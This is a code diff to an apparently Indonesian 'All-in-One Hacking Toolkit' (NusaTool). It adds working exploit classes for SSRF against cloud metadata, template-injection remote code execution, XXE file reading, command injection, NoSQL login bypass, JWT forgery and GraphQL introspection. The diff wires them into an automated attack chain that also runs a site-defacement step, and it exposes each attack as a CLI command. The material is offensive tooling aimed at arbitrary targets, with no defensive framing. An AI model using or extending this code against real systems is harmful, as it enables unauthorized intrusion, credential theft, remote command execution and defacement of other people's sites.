@@ -1,4 +1,4 @@
-#!/usr/bin/env python3
+#!/workspaces/nusantaratools/.venv/bin/python3
 """
 NusaTool v1.2.0 — All-in-One Hacking Toolkit
   • AutoPwn (8-phase auto hack)
@@ -15,7 +15,6 @@ urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
 from urllib.parse import urlparse, parse_qs, urljoin
 from queue import Queue
 from html import escape
-import bs4
 import concurrent.futures
 
 def phase_timeout(seconds):
@@ -4359,6 +4358,274 @@ class GoogleDorker:
 
 
 # ══════════════════════════════════════════════════════
+#  ADVANCED EXPLOITERS — SSRF / SSTI / XXE / CMDi / NoSQL / JWT / GraphQL
+# ══════════════════════════════════════════════════════
+
+class SSRFExploiter:
+    """Server-Side Request Forgery — probe internal services & cloud metadata."""
+    INTERNAL_URLS = [
+        "http://169.254.169.254/latest/meta-data/",       # AWS
+        "http://169.254.169.254/latest/user-data/",
+        "http://metadata.google.internal/computeMetadata/v1/",  # GCP
+        "http://169.254.169.254/metadata/instance?api-version=2021-02-01",  # Azure
+        "http://127.0.0.1:22", "http://127.0.0.1:80",
+        "http://127.0.0.1:3306", "http://127.0.0.1:6379",
+        "http://127.0.0.1:8080", "http://127.0.0.1:8443",
+        "http://localhost:22", "http://localhost:80",
+        "file:///etc/passwd", "file:///proc/self/environ",
+    ]
+    def __init__(self, target, param, bypass=None):
+        self.target = target.rstrip("/")
+        self.param = param
+        self.bypass = bypass or BypassEngine(target)
+        self.results = {"cloud": [], "internal": [], "file_read": []}
+    def _send(self, url):
+        try:
+            injected = self.target.replace(self.param+"=", self.param+"="+url, 1) if f"{self.param}=" in self.target else self.target
+            resp = self.bypass.get(injected, timeout=5)
+            return resp.text if resp else ""
+        except: return ""
+    def scan(self):
+        print(f"  {C}◉{N} Probing {len(self.INTERNAL_URLS)} internal endpoints...")
+        for url in self.INTERNAL_URLS:
+            txt = self._send(url)
+            if txt and len(txt) > 10 and "error" not in txt.lower()[:50]:
+                cat = "cloud" if "169.254" in url or "metadata" in url else ("file" if url.startswith("file:") else "internal")
+                print(f"  {G}✔{N} {W}{url[:50]}{N} → {len(txt)}b")
+                self.results[cat].append({"endpoint": url, "body": txt[:500]})
+                if cat == "cloud" and ("secret" in txt.lower() or "key" in txt.lower() or "token" in txt.lower()):
+                    print(f"  {R}{BOLD}⚠ CLOUD CREDENTIAL LEAK!{N}")
+        if not any(self.results.values()):
+            print(f"  {Y}−{N} No SSRF vector detected")
+        return self.results
+
+class SSTIExploiter:
+    """Server-Side Template Injection — detect & exploit (Jinja2/Twig/Freemarker/etc)."""
+    TESTS = [
+        ("{{7*7}}", "49"), ("${7*7}", "49"), ("#{7*7}", "49"),
+        ("{{''.class.mro[2].subclasses()}}", "subclasses"),
+        ("{{config}}", "config"), ("{{self}}", "<Template"),
+    ]
+    RCE_PAYLOADS = {
+        "python": "{{cycler.__init__.__globals__.os.popen('CMD').read()}}",
+        "ruby": "<%= system('CMD') %>",
+        "java": "${''.class.forName('java.lang.Runtime').getMethod('exec',''.class).invoke(''.class.forName('java.lang.Runtime').getRuntime(),'CMD')}",
+        "twig": "{{['']|filter('system')|join('CMD')}}",
+    }
+    def __init__(self, target, param, bypass=None):
+        self.target = target.rstrip("/")
+        self.param = param
+        self.bypass = bypass or BypassEngine(target)
+        self.detected = None
+    def _inject(self, p):
+        injected = self.target.replace(self.param+"=", self.param+"="+p, 1) if f"{self.param}=" in self.target else self.target
+        r = self.bypass.get(injected, timeout=5)
+        return r.text if r else ""
+    def detect(self):
+        for payload, expected in self.TESTS:
+            txt = self._inject(payload)
+            if expected in txt:
+                self.detected = "jinja2" if "{{" in payload else ("freemarker" if "${" in payload else "ruby")
+                print(f"  {G}✔{N} SSTI detected: {Y}{self.detected}{N} via {W}{payload}{N}")
+                return self.detected
+        print(f"  {Y}−{N} No SSTI detected")
+        return None
+    def exec_cmd(self, cmd):
+        if not self.detected:
+            self.detect()
+        for lang, tpl in self.RCE_PAYLOADS.items():
+            p = tpl.replace("CMD", cmd)
+            try:
+                txt = self._inject(p)
+                if txt and len(txt) > 5 and "error" not in txt.lower()[:30]:
+                    print(f"  {G}✔{N} SSTI RCE ({lang}): {W}{txt[:200]}{N}")
+                    return txt[:500]
+            except: pass
+        print(f"  {Y}−{N} SSTI RCE failed")
+        return None
+
+class XXEExploiter:
+    """XML External Entity — file read + SSRF via XXE."""
+    def __init__(self, target, param, bypass=None):
+        self.target = target.rstrip("/")
+        self.param = param
+        self.bypass = bypass or BypassEngine(target)
+    def _build_xxe(self, entity, ref):
+        return f"""<?xml version="1.0"?><!DOCTYPE root [<!ENTITY {entity} SYSTEM "{ref}">]><root>&{entity};</root>"""
+    def _send_xml(self, body):
+        try:
+            injected = self.target.replace(self.param+"=", self.param+"="+body[:100], 1) if f"{self.param}=" in self.target else self.target
+            r = self.bypass.post(injected, data=body, headers={"Content-Type":"application/xml"})
+            return r.text[:1000] if r else ""
+        except: return ""
+    def read_file(self, path="/etc/passwd"):
+        xxe = self._build_xxe("x", f"file://{path}")
+        txt = self._send_xml(xxe)
+        if txt and "root:" in txt:
+            print(f"  {G}✔{N} XXE file read: {Y}{path}{N} — {W}{txt[:80].strip()}{N}")
+            return txt
+        print(f"  {Y}−{N} XXE file read failed")
+        return None
+    def ssrf(self, target_url="http://169.254.169.254/latest/meta-data/"):
+        xxe = self._build_xxe("x", target_url)
+        txt = self._send_xml(xxe)
+        if txt and len(txt) > 20:
+            print(f"  {G}✔{N} XXE SSRF: {Y}{target_url}{N} → {W}{txt[:100]}{N}")
+            return txt
+        return None
+    def scan(self):
+        print(f"  {C}◉{N} Testing XXE via parameter: {W}{self.param}{N}")
+        r = self.read_file("/etc/passwd")
+        if not r:
+            r = self.read_file("/etc/hostname")
+        if not r:
+            print(f"  {Y}−{N} No XXE detected")
+        return r
+
+class CmdInjectionExploiter:
+    """Command Injection — blind (time-based) + non-blind detection."""
+    PAYLOADS = {
+        "basic": [";id", "|id", "`id`", "$(id)", "&id", ";whoami", "|whoami", "`whoami`"],
+        "blind": [";sleep 3", "|sleep 3", "`sleep 3`", "$(sleep 3)", "&sleep 3"],
+        "windows": [";dir", "|dir", "&dir"],
+    }
+    def __init__(self, target, param, bypass=None):
+        self.target = target.rstrip("/")
+        self.param = param
+        self.bypass = bypass or BypassEngine(target)
+        self.vulnerable = False
+    def _inject(self, p):
+        injected = self.target.replace(self.param+"=", self.param+"="+p, 1) if f"{self.param}=" in self.target else self.target
+        t0 = time.time()
+        r = self.bypass.get(injected, timeout=8)
+        return (r.text if r else ""), time.time()-t0
+    def detect(self):
+        baseline, _ = self._inject("")
+        t0 = time.time()
+        for p in self.PAYLOADS["blind"][:2]:
+            txt, t = self._inject(p)
+            if t - t0 > 2.5:
+                print(f"  {G}✔{N} Blind CMDi detected (time-based, {t:.1f}s)")
+                self.vulnerable = True; return True
+        for p in self.PAYLOADS["basic"]:
+            txt, _ = self._inject(p)
+            if ("uid=" in txt) or ("root:" in txt) or ("hostname" in txt.lower()) or (txt != baseline and len(txt) > 10 and len(txt) < len(baseline)*1.5 and "not found" not in txt.lower()):
+                print(f"  {G}✔{N} CMDi detected via {W}{p}{N}")
+                self.vulnerable = True; return True
+        print(f"  {Y}−{N} No command injection")
+        return False
+    def exec_cmd(self, cmd="id"):
+        for prefix in [";", "|", "`", "$("]:
+            injected = self.target.replace(self.param+"=", self.param+"="+prefix+cmd, 1)
+            try:
+                r = self.bypass.get(injected, timeout=8)
+                if r and cmd.split()[0] in r.text:
+                    print(f"  {G}✔{N} CMDi exec: {W}{r.text[:200].strip()}{N}")
+                    return r.text[:1000]
+            except: pass
+        return None
+
+class NoSQLiExploiter:
+    """NoSQL Injection — MongoDB authentication bypass & data extraction."""
+    PAYLOADS = [
+        "admin' || true || '", "admin' || 1==1 || '",
+        "admin' || '1'=='1", 'admin" || "1"=="1',
+        '{"$gt": ""}', '{"$ne": ""}', '{"$gt": "a"}',
+        'admin", "password": {"$gt": ""}}',
+        "username=admin&password[$gt]=&password[$ne]=x",
+        "username[$ne]=x&password[$gt]=&password[$ne]=",
+    ]
+    def __init__(self, target, param, bypass=None):
+        self.target = target.rstrip("/")
+        self.param = param
+        self.bypass = bypass or BypassEngine(target)
+    def _inject(self, p):
+        injected = self.target.replace("="+self.param.split("=")[-1] if "=" in self.target else self.param, "="+p, 1)
+        r = self.bypass.get(injected, timeout=5)
+        return r.status_code if r else 0
+    def scan(self):
+        baseline = self._inject("")
+        for p in self.PAYLOADS:
+            code = self._inject(p)
+            if code != baseline:
+                print(f"  {G}✔{N} NoSQLi via {W}{p[:50]}{N} (status {baseline}→{code})")
+                return True
+        print(f"  {Y}−{N} No NoSQL injection")
+        return False
+
+class JWTExploiter:
+    """JWT attacks — none alg, weak secret crack, kid injection."""
+    def __init__(self, token):
+        self.token = token
+        self.header = self._decode_segment(0) or {}
+        self.payload = self._decode_segment(1) or {}
+    def _decode_segment(self, idx):
+        try:
+            seg = self.token.split(".")[idx]
+            seg += "=" * (4 - len(seg) % 4)
+            return json.loads(base64.urlsafe_b64decode(seg))
+        except: return None
+    def _encode(self, header, payload, sig=""):
+        h = base64.urlsafe_b64encode(json.dumps(header).encode()).rstrip(b"=").decode()
+        p = base64.urlsafe_b64encode(json.dumps(payload).encode()).rstrip(b"=").decode()
+        return f"{h}.{p}.{sig or 'x'}"
+    def attack_none(self):
+        if self.header.get("alg","").lower() != "none":
+            t = self._encode({"alg":"none","typ":"JWT"}, self.payload)
+            print(f"  {G}✔{N} JWT none-alg: {W}{t[:60]}...{N}")
+            return t
+        return None
+    def attack_kid(self, path="/etc/passwd"):
+        h2 = dict(self.header, kid=path)
+        t = self._encode(h2, self.payload)
+        print(f"  {G}✔{N} JWT kid-injection: {W}{t[:60]}...{N}")
+        return t
+    def attack_weak(self, wordlist=["secret","admin","password","key","12345","jwt_secret","supersecret"]):
+        for w in wordlist:
+            try:
+                import hmac, hashlib
+                sig = base64.urlsafe_b64encode(hmac.new(w.encode(), self.token.rsplit(".",1)[0].encode(), hashlib.sha256).digest()).rstrip(b"=").decode()
+                if sig == self.token.split(".")[2]:
+                    print(f"  {G}✔{N} JWT weak secret: {Y}{w}{N}")
+                    return w
+            except: pass
+        print(f"  {Y}−{N} JWT secret not in wordlist")
+        return None
+    def scan(self):
+        print(f"  {C}◉{N} JWT header: {self.header}  payload: {self.payload}")
+        for kid in ["none","kid"]:
+            getattr(self, f"attack_{kid}")()
+        self.attack_weak()
+
+class GraphQLExploiter:
+    """GraphQL — introspection dump & batching brute."""
+    INTROSPECT = """
+    query{__schema{types{kind name fields{name args{name type{name kind}}}}}}"""
+    def __init__(self, target, endpoint="/graphql", bypass=None):
+        self.target = target.rstrip("/")
+        self.endpoint = endpoint
+        self.bypass = bypass or BypassEngine(target)
+    def _query(self, q):
+        try:
+            r = self.bypass.post(self.target+self.endpoint, json={"query": q}, timeout=8)
+            return r.json() if r else {}
+        except: return {}
+    def introspect(self):
+        data = self._query(self.INTROSPECT)
+        types = data.get("data",{}).get("__schema",{}).get("types",[])
+        if types:
+            print(f"  {G}✔{N} GraphQL introspection: {Y}{len(types)}{N} types")
+            for t in types[:10]:
+                print(f"    {D}→{N} {W}{t.get('name','?')}{N} ({len(t.get('fields',[]))} fields)")
+            return types
+        print(f"  {Y}−{N} GraphQL introspection disabled")
+        return []
+    def scan(self):
+        print(f"  {C}◉{N} Probing {W}{self.target+self.endpoint}{N}")
+        self.introspect()
+
+
+# ══════════════════════════════════════════════════════
 #  AUTO HACK — Full Auto Exploitation Chain
 # ══════════════════════════════════════════════════════
 
@@ -4371,7 +4638,8 @@ class AutoHack:
         self.domain = None
         self.base_url = None
         self.bypass = None
-        self.results = {"exploits": [], "shells": [], "sqli_data": {}, "creds": [], "ports": []}
+        self.results = {"exploits": [], "shells": [], "sqli_data": {}, "creds": [], "ports": [],
+                        "ssrf": {}, "ssti": {}, "xxe": {}, "cmdi": {}, "nosqli": [], "jwt": [], "graphql": []}
         self.phases = []
         self.t0 = time.time()
 
@@ -4695,6 +4963,80 @@ class AutoHack:
         deface_msg = self.results.get("deface_msg", "HACKED BY NUSA EXPLOIT TEAM")
         self._auto_deface(deface_msg)
 
+        # PHASE 9: SSRF (if param exists)
+        if "=" in self.base_url:
+            print(f"\n  {R}{BOLD}◆ PHASE 9: SSRF{N}")
+            try:
+                pnames = list(parse_qs(urlparse(self.base_url).query).keys())
+                if pnames:
+                    self.results["ssrf"] = SSRFExploiter(self.base_url, pnames[0], self.bypass).scan()
+                    self._log("ssrf", "ok" if any(self.results["ssrf"].values()) else "skip", "")
+            except Exception as e:
+                self._log("ssrf", "fail", str(e)[:30])
+
+        # PHASE 10: SSTI
+        if "=" in self.base_url:
+            print(f"\n  {R}{BOLD}◆ PHASE 10: SSTI (Template Injection){N}")
+            try:
+                pnames = list(parse_qs(urlparse(self.base_url).query).keys())
+                if pnames:
+                    ssti = SSTIExploiter(self.base_url, pnames[0], self.bypass)
+                    ssti.detect()
+                    rce = ssti.exec_cmd("id;hostname;whoami")
+                    if rce: self.results["ssti"] = {"rce": rce[:300]}
+                    self._log("ssti", "ok" if rce else "detect", "")
+            except Exception as e:
+                self._log("ssti", "fail", str(e)[:30])
+
+        # PHASE 11: XXE (XML injection)
+        if "=" in self.base_url:
+            print(f"\n  {R}{BOLD}◆ PHASE 11: XXE (XML External Entity){N}")
+            try:
+                pnames = list(parse_qs(urlparse(self.base_url).query).keys())
+                if pnames:
+                    xxe = XXEExploiter(self.base_url, pnames[0], self.bypass)
+                    xxe.scan()
+                    self._log("xxe", "ok", "")
+            except: self._log("xxe", "fail", "")
+
+        # PHASE 12: CMDi (Command Injection)
+        if "=" in self.base_url:
+            print(f"\n  {R}{BOLD}◆ PHASE 12: COMMAND INJECTION{N}")
+            try:
+                pnames = list(parse_qs(urlparse(self.base_url).query).keys())
+                if pnames:
+                    cmdi = CmdInjectionExploiter(self.base_url, pnames[0], self.bypass)
+                    if cmdi.detect():
+                        r = cmdi.exec_cmd("id;hostname;whoami")
+                        if r: self.results["cmdi"] = {"rce": r[:300]}
+                    self._log("cmdi", "ok" if self.results.get("cmdi") else "skip", "")
+            except Exception as e:
+                self._log("cmdi", "fail", str(e)[:30])
+
+        # PHASE 13: NoSQL Injection
+        if "=" in self.base_url:
+            print(f"\n  {R}{BOLD}◆ PHASE 13: NoSQL INJECTION{N}")
+            try:
+                nosqli = NoSQLiExploiter(self.base_url, self.base_url.split("?")[1] if "?" in self.base_url else "", self.bypass)
+                self.results["nosqli"] = nosqli.scan()
+                self._log("nosqli", "ok" if self.results["nosqli"] else "skip", "")
+            except: self._log("nosqli", "fail", "")
+
+        # PHASE 14: GraphQL (always check /graphql)
+        print(f"\n  {R}{BOLD}◆ PHASE 14: GRAPHQL{N}")
+        try:
+            gql = GraphQLExploiter(self.base_url, "/graphql", self.bypass)
+            res = gql.scan()
+            self.results["graphql"] = res
+            self._log("graphql", "ok" if res else "skip", "")
+        except: self._log("graphql", "fail", "")
+
+        # PHASE 15: JWT (if session cookie found)
+        # JWT check — scans browser-stored tokens (manual-input phase)
+        print(f"\n  {R}{BOLD}◆ PHASE 15: JWT AUDIT{N}")
+        print(f"  {D}  Tip: Run 'jwt <token>' manually to audit JWT tokens{N}")
+        self._log("jwt", "skip", "manual")
+
         # SUMMARY
         elapsed = time.time() - self.t0
         print(f"\n  {R}{BOLD}{'═'*55}{N}")
@@ -4786,6 +5128,14 @@ class NusaCLI:
     {G}xss{N}            {D}-u <url> [--proxy]{N}
     {G}sqli{N}           {D}-u <url> [--proxy]{N}
     {G}urlscan{N}         {D}-u <url> [--proxy]{N}
+    {C}◈ ADVANCED WEB EXPLOIT (OVER POWER){N}
+    {G}ssrf{N}            {D}-u <url> --param <name> [--proxy]{N}
+    {G}ssti{N}            {D}-u <url> --param <name> [--cmd <cmd>] [--proxy]{N}
+    {G}xxe{N}             {D}-u <url> --param <name> [--file <path>] [--proxy]{N}
+    {G}cmdi{N}            {D}-u <url> --param <name> [--cmd <cmd>] [--proxy]{N}
+    {G}nosqli{N}          {D}-u <url> [--proxy]{N}
+    {G}graphql{N}         {D}-u <url> [--endpoint /graphql] [--query <q>] [--proxy]{N}
+    {G}jwt{N}             {D}<token> [--weaklist <file>]{N}
 
   {Y}◈ RECON / OSINT{N}
     {G}subdomain{N}      {D}-d <domain> [--wordlist] [--threads]{N}
@@ -4975,6 +5325,44 @@ class NusaCLI:
                     print(f"  {R}✘{N} Usage: svcexploit --target <host> -u <user> -p <pass> [--service ssh|ftp|mysql]")
                     return
                 ServiceExploiter(target, user, pwd, int(port) if port else None).run([svc])
+            elif cmd == "ssrf":
+                u = self._get(args,"-u","--url")
+                param = self._get(args,"--param") or self._get(args,"-p")
+                if not u or not param: print(f"  {R}✘{N} Usage: ssrf -u <url> --param <name>"); return
+                SSRFExploiter(u, param, BypassEngine(u)).scan()
+            elif cmd == "ssti":
+                u = self._get(args,"-u","--url")
+                param = self._get(args,"--param") or self._get(args,"-p")
+                cmd = self._get(args,"--cmd") or "id;hostname"
+                if not u or not param: print(f"  {R}✘{N} Usage: ssti -u <url> --param <name> [--cmd <cmd>]"); return
+                ssti = SSTIExploiter(u, param, BypassEngine(u))
+                ssti.detect(); ssti.exec_cmd(cmd)
+            elif cmd == "xxe":
+                u = self._get(args,"-u","--url")
+                param = self._get(args,"--param") or self._get(args,"-p")
+                f = self._get(args,"--file") or "/etc/passwd"
+                if not u or not param: print(f"  {R}✘{N} Usage: xxe -u <url> --param <name> [--file <path>]"); return
+                XXEExploiter(u, param, BypassEngine(u)).read_file(f)
+            elif cmd == "cmdi":
+                u = self._get(args,"-u","--url")
+                param = self._get(args,"--param") or self._get(args,"-p")
+                cmd = self._get(args,"--cmd") or "id"
+                if not u or not param: print(f"  {R}✘{N} Usage: cmdi -u <url> --param <name> [--cmd <cmd>]"); return
+                cmdi = CmdInjectionExploiter(u, param, BypassEngine(u))
+                cmdi.detect(); cmdi.exec_cmd(cmd)
+            elif cmd == "nosqli":
+                u = self._get(args,"-u","--url")
+                if not u: print(f"  {R}✘{N} Usage: nosqli -u <url>"); return
+                NoSQLiExploiter(u, u.split("?")[1] if "?" in u else "", BypassEngine(u)).scan()
+            elif cmd == "graphql":
+                u = self._get(args,"-u","--url")
+                ep = self._get(args,"--endpoint") or "/graphql"
+                if not u: print(f"  {R}✘{N} Usage: graphql -u <url> [--endpoint /graphql]"); return
+                GraphQLExploiter(u, ep, BypassEngine(u)).scan()
+            elif cmd == "jwt":
+                token = args[0] if args else None
+                if not token: print(f"  {R}✘{N} Usage: jwt <token> [--weaklist <file>]"); return
+                JWTExploiter(token).scan()
             elif cmd in ("blindsqli", "blind-sqli"):
                 u = self._get(args,"-u","--url")
                 param = self._get(args,"--param") or self._get(args,"-p")
@@ -5241,9 +5629,46 @@ def direct(module, args):
             p.add_argument("-U","--usernames"); p.add_argument("-P","--passwords"); p.add_argument("--proxy")
             a = p.parse_args(args)
             ServiceBruteforcer(a.target, a.port, a.service, a.usernames, a.passwords, a.threads).run()
+        elif module == "ssrf":
+            p = argparse.ArgumentParser(prog="ssrf")
+            p.add_argument("-u","--url",required=True); p.add_argument("--param",required=True); p.add_argument("--proxy")
+            a = p.parse_args(args); SSRFExploiter(a.url, a.param, BypassEngine(a.url, a.proxy)).scan()
+        elif module == "ssti":
+            p = argparse.ArgumentParser(prog="ssti")
+            p.add_argument("-u","--url",required=True); p.add_argument("--param",required=True)
+            p.add_argument("--cmd",default="id;hostname"); p.add_argument("--proxy")
+            a = p.parse_args(args)
+            ssti = SSTIExploiter(a.url, a.param, BypassEngine(a.url, a.proxy))
+            ssti.detect(); ssti.exec_cmd(a.cmd)
+        elif module == "xxe":
+            p = argparse.ArgumentParser(prog="xxe")
+            p.add_argument("-u","--url",required=True); p.add_argument("--param",required=True)
+            p.add_argument("--file",default="/etc/passwd"); p.add_argument("--proxy")
+            a = p.parse_args(args); XXEExploiter(a.url, a.param, BypassEngine(a.url, a.proxy)).read_file(a.file)
+        elif module == "cmdi":
+            p = argparse.ArgumentParser(prog="cmdi")
+            p.add_argument("-u","--url",required=True); p.add_argument("--param",required=True)
+            p.add_argument("--cmd",default="id"); p.add_argument("--proxy")
+            a = p.parse_args(args)
+            cmdi = CmdInjectionExploiter(a.url, a.param, BypassEngine(a.url, a.proxy))
+            cmdi.detect(); cmdi.exec_cmd(a.cmd)
+        elif module == "nosqli":
+            p = argparse.ArgumentParser(prog="nosqli")
+            p.add_argument("-u","--url",required=True); p.add_argument("--proxy")
+            a = p.parse_args(args)
+            NoSQLiExploiter(a.url, a.url.split("?")[1] if "?" in a.url else "", BypassEngine(a.url, a.proxy)).scan()
+        elif module == "graphql":
+            p = argparse.ArgumentParser(prog="graphql")
+            p.add_argument("-u","--url",required=True); p.add_argument("--endpoint",default="/graphql")
+            p.add_argument("--query"); p.add_argument("--proxy")
+            a = p.parse_args(args); GraphQLExploiter(a.url, a.endpoint, BypassEngine(a.url, a.proxy)).scan()
+        elif module == "jwt":
+            p = argparse.ArgumentParser(prog="jwt")
+            p.add_argument("token",help="JWT token to audit"); p.add_argument("--weaklist")
+            a = p.parse_args(args); JWTExploiter(a.token).scan()
         else:
             print(f"  {R}✘{N} Unknown: {Y}{module}{N}")
-            print(f"  {C}◈{N} Available: {G}autohack autopwn webshell revshell lfi sqlauto blindsqli cms svcexploit svcbrute scan cors csrf urlscan portscan servicedetect xss sqli deface subdomain dns whois dirbust loginbf autobf hashcrack paramspider report session update dork{N}")
+            print(f"  {C}◈{N} Available: {G}autohack autopwn webshell revshell lfi sqlauto blindsqli cms svcexploit svcbrute scan cors csrf urlscan portscan servicedetect xss sqli deface subdomain dns whois dirbust loginbf autobf hashcrack paramspider report session update dork ssrf ssti xxe cmdi nosqli graphql jwt{N}")
     except SystemExit: pass
     except Exception as e: print(f"  {R}✘ Error:{N} {e}")
 
@@ -5261,7 +5686,8 @@ def main():
         "loginbf","hashcrack","hash","report","paramspider","deface","autobf",
         "autologin","help","webshell","revshell","reverseshell","lfi","sqlauto",
         "sqlautodump","cms","svcexploit","servicex","blindsqli","blind-sqli",
-        "svcbrute","servicebrute","session","update","dork"):
+        "svcbrute","servicebrute","session","update","dork",
+        "ssrf","ssti","xxe","cmdi","nosqli","graphql","jwt"):
         AutoPwn(sys.argv[1]).run(); return
     print(BANNER); direct(sys.argv[1], sys.argv[2:])
 
